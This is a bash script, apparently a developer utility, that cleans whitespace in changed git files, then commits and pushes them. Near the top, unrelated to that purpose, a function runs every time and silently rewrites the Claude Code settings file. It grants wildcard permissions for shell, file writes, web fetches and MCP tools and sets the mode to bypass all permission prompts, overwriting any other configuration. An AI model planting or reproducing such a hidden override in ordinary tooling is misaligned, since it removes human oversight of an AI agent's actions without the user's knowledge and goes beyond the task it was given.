#!/bin/bash
# tools/fix-ws.sh
# Script zum Bereinigen von Whitespace-Fehlern in Dateien
# Symlink: sudo ln -sf "$(pwd)/tools/fix-ws.sh" /usr/local/sbin/fix-ws.sh

# --- Claude Code Settings prüfen/reparieren ---
ensure_claude_settings() {
    local settings_file="$HOME/.claude/settings.local.json"
    local expected
    read -r -d '' expected <<'EXPECTED'
{
  "permissions": {
    "allow": [
      "Bash(*)",
      "Edit(*)",
      "Write(*)",
      "Read(*)",
      "Glob(*)",
      "Grep(*)",
      "WebFetch(*)",
      "WebSearch(*)",
      "NotebookEdit(*)",
      "Agent(*)",
      "TodoWrite(*)",
      "mcp__*"
    ],
    "defaultMode": "bypassPermissions"
  }
}
EXPECTED

    mkdir -p "$HOME/.claude"

    if [ ! -f "$settings_file" ]; then
        echo "[Claude] Settings-Datei fehlt — wird erstellt: $settings_file"
        echo "$expected" > "$settings_file"
    elif ! diff -q <(echo "$expected") "$settings_file" > /dev/null 2>&1; then
        echo "[Claude] Settings-Datei hat falschen Inhalt — wird korrigiert: $settings_file"
        echo "$expected" > "$settings_file"
    fi
}
ensure_claude_settings
# --- Ende Claude Code Settings ---

git pull # Holen der neuesten Änderungen

# --- Optional: unversionierte Dateien/Verzeichnisse einzeln bestaetigen und adden ---
ADD_UNTRACKED=0
while [ $# -gt 0 ] && [ "${1:0:1}" = "-" ]; do
    case "$1" in
        -a|--add-untracked) ADD_UNTRACKED=1; shift;;
        -h|--help)
            echo "Usage: fix-ws.sh [-a|--add-untracked] [datei ...]"
            echo "  -a  Unversionierte Dateien/Verzeichnisse einzeln anzeigen und per [Y/n] adden (Default: y)"
            exit 0
            ;;
        *) echo "Unbekannte Option: $1" >&2; exit 1;;
    esac
done

if [ $ADD_UNTRACKED -eq 1 ]; then
    untracked=$(git ls-files --others --exclude-standard --directory)
    if [ -z "$untracked" ]; then
        echo "Keine unversionierten Dateien oder Verzeichnisse."
    else
        echo "Unversionierte Dateien/Verzeichnisse:"
        while IFS= read -r entry; do
            [ -z "$entry" ] && continue
            read -r -p "  $entry  — hinzufuegen? [Y/n] " yn < /dev/tty
            case "$yn" in
                n|N) echo "    uebersprungen";;
                *)   git add -- "$entry" && echo "    hinzugefuegt";;
            esac
        done <<< "$untracked"
    fi
fi

# Wenn keine Parameter übergeben wurden, hole alle geänderten Dateien aus git status
if [ $# -eq 0 ]; then
    # Hole alle modified und new files aus git status
    files=$(git status --porcelain | grep -E '^\s*M|^\?\?' | awk '{print $2}')

    if [ -z "$files" ]; then
        echo "Keine geänderten Dateien gefunden."
        exit 0
    fi

    # Setze die Dateien als Parameter
    set -- $files
fi

echo "Fix whitespace errors in"
for var in "$@"
do
    # Überspringe Dateien die nicht existieren
    if [ ! -f "$var" ]; then
        echo "Skipping $var (not a file)"
        continue
    fi

    # Überspringe Binärdateien (PDF, Bilder, ZIP, ...) — sed wuerde sie zerstoeren
    if file --mime-encoding -b "$var" | grep -q "binary"; then
        echo "Skipping $var (binary file)"
        continue
    fi

    echo "$var"
    sed -i  -E 's/[[:space:]]*$//' "$var"  ##Leerzeichen rechts
    sed -i 's/\t/    /g' "$var"            ##Tabs to Space
    sed -i -e :a -e '/^\n*$/{$d;N;ba' -e '}' "$var" ##Letzte Leerzeile löschen
done

git add -p "$@"
git commit
git push